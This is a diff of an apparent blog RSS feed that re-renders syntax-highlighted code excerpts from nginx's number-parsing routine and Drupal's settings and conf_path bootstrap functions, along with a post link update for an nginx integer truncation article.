-        &amp;lt;span class=&quot;k&quot;&amp;gt;if&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;o&quot;&amp;gt;*&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;n&quot;&amp;gt;line&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;&amp;amp;lt;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;sc&quot;&amp;gt;&amp;amp;#39;0&amp;amp;#39;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;||&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;*&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;n&quot;&amp;gt;line&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;&amp;amp;gt;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;sc&quot;&amp;gt;&amp;amp;#39;9&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;)&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;{&amp;lt;/span&amp;gt;
-            &amp;lt;span class=&quot;k&quot;&amp;gt;return&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;NGX_ERROR&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt;
-        &amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt;
-
-        &amp;lt;span class=&quot;k&quot;&amp;gt;if&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;n&quot;&amp;gt;value&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;&amp;amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;cutoff&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;&amp;amp;amp;&amp;amp;amp;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;n&quot;&amp;gt;value&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;&amp;amp;gt;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;cutoff&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;||&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;*&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;n&quot;&amp;gt;line&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;-&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;sc&quot;&amp;gt;&amp;amp;#39;0&amp;amp;#39;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;&amp;amp;gt;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;cutlim&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;))&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;{&amp;lt;/span&amp;gt;
-            &amp;lt;span class=&quot;k&quot;&amp;gt;return&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;NGX_ERROR&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt;
-        &amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt;
-
-        &amp;lt;span class=&quot;n&quot;&amp;gt;value&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;value&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;*&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;mi&quot;&amp;gt;10&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;+&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;o&quot;&amp;gt;*&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;n&quot;&amp;gt;line&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;-&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;sc&quot;&amp;gt;&amp;amp;#39;0&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;);&amp;lt;/span&amp;gt;
-    &amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt;
-
-    &amp;lt;span class=&quot;k&quot;&amp;gt;return&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;n&quot;&amp;gt;value&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt;
-&amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt;&amp;lt;/code&amp;gt;&amp;lt;/pre&amp;gt;&amp;lt;/figure&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
 
 &lt;h2&gt;Example of exploitation Varnish + Nginx&lt;/h2&gt;
 
@@ -2470,7 +2891,7 @@ If I remember well, the one used for the Content-Length header parsing is &lt;co
 
 </description>
 				<published>2015-03-25 00:00:00 +0100</published>
-				<link>http://regilero.github.io/security/english/2015/03/25/nginx-integer_truncation/</link>
+				<link>http://regilero.github.io/english/security/2015/03/25/nginx-integer_truncation/</link>
 			</item>
 		
 			<item>
@@ -2585,58 +3006,58 @@ Host: www.example.com
 
 &lt;p&gt;One of the early step done while bootstraping Drupal is to load the configuration file. This file will give you, for example, access to the database, or the &lt;code&gt;$base_url&lt;/code&gt; enforced setting.&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-    &lt;span class=&quot;sd&quot;&gt;/&lt;em&gt;*&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+    &lt;span class=&quot;sd&quot;&gt;/**&lt;/span&gt;
 &lt;span class=&quot;sd&quot;&gt;     * Sets the base URL, cookie domain, and session name from configuration.&lt;/span&gt;
-&lt;span class=&quot;sd&quot;&gt;     &lt;/em&gt;/&lt;/span&gt;
+&lt;span class=&quot;sd&quot;&gt;     */&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;drupal_settings_initialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$base_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$base_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$base_root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
+      &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$base_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$base_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$base_root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    
+      &lt;span class=&quot;c1&quot;&gt;// Export these settings.php variables to the global namespace.&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$databases&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cookie_domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$installed_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$update_free_access&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db_prefix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$drupal_hash_salt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$is_https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$base_secure_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$base_insecure_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;conf_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/settings.php&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;conf_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/settings.php&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;pre&gt;&lt;code&gt;  &amp;lt;span class=&quot;c1&quot;&amp;gt;// Export these settings.php variables to the global namespace.&amp;lt;/span&amp;gt;
-  &amp;lt;span class=&quot;k&quot;&amp;gt;global&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$databases&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$cookie_domain&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$conf&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$installed_profile&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt;     &amp;lt;span class=&quot;nv&quot;&amp;gt;$update_free_access&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$db_url&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$db_prefix&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$drupal_hash_salt&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$is_https&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$base_secure_url&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$base_insecure_url&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt;
-  &amp;lt;span class=&quot;nv&quot;&amp;gt;$conf&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;k&quot;&amp;gt;array&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;();&amp;lt;/span&amp;gt;
-
-  &amp;lt;span class=&quot;k&quot;&amp;gt;if&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nb&quot;&amp;gt;file_exists&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nx&quot;&amp;gt;DRUPAL_ROOT&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;/&amp;amp;#39;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nx&quot;&amp;gt;conf_path&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;()&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;/settings.php&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;))&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;{&amp;lt;/span&amp;gt;
-    &amp;lt;span class=&quot;k&quot;&amp;gt;include_once&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nx&quot;&amp;gt;DRUPAL_ROOT&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;/&amp;amp;#39;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nx&quot;&amp;gt;conf_path&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;()&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;/settings.php&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt;
-  &amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt;&amp;lt;/code&amp;gt;&amp;lt;/pre&amp;gt;&amp;lt;/figure&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Here we see that the settings path depends on the &lt;code&gt;conf_path()&lt;/code&gt; call. This function is quite short, there&#39;s a &lt;code&gt;drupal_static&lt;/code&gt; thing which is simply a way to avoid re-doing stuff after the first call (in the same HTTP request), it&#39;s basically a lazy-loading-run-only-once shortcut.&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;conf_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$require_settings&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$reset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;drupal_static&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;&lt;strong&gt;FUNCTION&lt;/strong&gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
+      &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;drupal_static&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__FUNCTION__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$reset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&amp;lt;-- here is the run-only-once thing I was talking about&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    
+      &lt;span class=&quot;nv&quot;&gt;$confdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;sites&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    
+      &lt;span class=&quot;nv&quot;&gt;$sites&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$confdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/sites.php&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// This will overwrite $sites with the desired mappings.&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$confdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/sites.php&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    
+      &lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;SCRIPT_NAME&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;SCRIPT_NAME&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;SCRIPT_FILENAME&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;implode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rtrim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;HTTP_HOST&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))));&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+          &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;implode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span 